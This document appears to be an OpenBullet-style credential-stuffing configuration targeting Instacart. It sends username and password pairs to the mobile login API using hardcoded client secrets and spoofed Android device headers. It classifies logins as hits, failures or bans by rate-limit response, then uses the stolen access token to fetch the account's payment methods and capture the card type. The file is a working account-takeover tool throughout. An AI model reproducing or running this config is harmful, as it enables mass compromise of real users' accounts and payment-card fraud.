@@ -1,0 +1,60 @@
+REQUEST POST "https://www.instacart.com/v3/dynamic_data/authenticate/login" 
+  CONTENT "{\"scope\":\"\",\"grant_type\":\"password\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"3bd6e0280af2010246254b1db22fa21ad1ab1472483a3bff6697d24d43a291ed\",\"client_secret\":\"5927db93f21ed83de8acdae58a6c3c35cd119c56a4b1cc1c5437e2072db9f51a\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Ahoy-Visitor: 777596578587458f8be7b2d4414f51b9" 
+  HEADER "x-android-api-version: 25" 
+  HEADER "User-Agent: Android-7.1.2 5.48.0-v2 SM-G935F" 
+  HEADER "x-client-ads-tracking-enabled: true" 
+  HEADER "x-client-version: 5.48.0" 
+  HEADER "x-client-device-id: e7c4a534-f9e6-4e84-a7a3-0c3855131a25" 
+  HEADER "x-client-identifier: Android" 
+  HEADER "x-client-os: android" 
+  HEADER "x-device-class: tablet" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Host: www.instacart.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: build_sha=58332ec8d3ccb02e9dae34f916e812a9c26caf1d; ahoy_visit=93a75936-0cb1-4d82-8716-0e263dc284aa; ahoy_track=true; _instacart_session=OHJUdFBwaUt2SlpLOWoyS2xqM2I1ZXNNczBzUjJLeVhyS0RRcnIxcnMzQ1pXcnIwZlRVSDJhRUttUU9iaHRBelhWU05lR0JpTS9CZ3g3T3dqTTZrOGd4enFvQnNLOW1ydGFBeFB5SG0xL2c9LS11VldQcGNrcm02b3VSSXFSVDMxSWlRPT0%3D--51eee3fe4b4c6c3c6eac52bd8d591d87d1701771" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 248" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password" 
+    KEY "Your account is locked due to too many failed log in attempts. Check your email for unlock instructions" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "at" 
+
+REQUEST GET "https://www.instacart.com/v3/payment_methods" 
+  
+  HEADER "Ahoy-Visitor: 777596578587458f8be7b2d4414f51b9" 
+  HEADER "x-android-api-version: 25" 
+  HEADER "User-Agent: Android-7.1.2 5.48.0-v2 SM-G935F" 
+  HEADER "x-client-ads-tracking-enabled: true" 
+  HEADER "Authorization: Bearer <at>" 
+  HEADER "x-client-version: 5.48.0" 
+  HEADER "x-client-device-id: e7c4a534-f9e6-4e84-a7a3-0c3855131a25" 
+  HEADER "x-client-identifier: Android" 
+  HEADER "content-type: application/json" 
+  HEADER "x-client-os: android" 
+  HEADER "x-device-class: tablet" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: www.instacart.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: build_sha=58332ec8d3ccb02e9dae34f916e812a9c26caf1d; ahoy_visit=93a75936-0cb1-4d82-8716-0e263dc284aa; ahoy_track=true; _instacart_session=a0VFTWpyWVdrRmlIWCtzcTVWcm5LK1lHSmUvck9Da1VIVGhtZW91UU9Fa0drZ2E1OG42dnFUcXdjL0Z5eTJ0OHVVVWRXeFlqQnNGYzMxYyt6RUhWM3V6R3B2bjE0VmN5Zml4T040bjlXbm14dS8rK3JLUUFJaWJLTEJGa1VpaSt2WndnYVR5M2dXZzlzVGJnT1hDRUpsN01TSGovWThKUlFHa0J4S1Y0V0tDWTJkdG5lY2t0dktsblFPWjlzK3d0LS1ydWtCaERCRVJya0NMMEsrMkpNTG53PT0%3D--ae43bf79865b8ebf43aa5adb090a047eec215416" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "payment_methods\":[]" 
+
+PARSE "<SOURCE>" JSON "type" Recursive=TRUE -> VAR "ct" 
+
+FUNCTION Replace "credit_card, " "" "<ct>" -> VAR "ct2" 
+
+FUNCTION Constant "<ct2>" -> CAP "Card Type" 
+
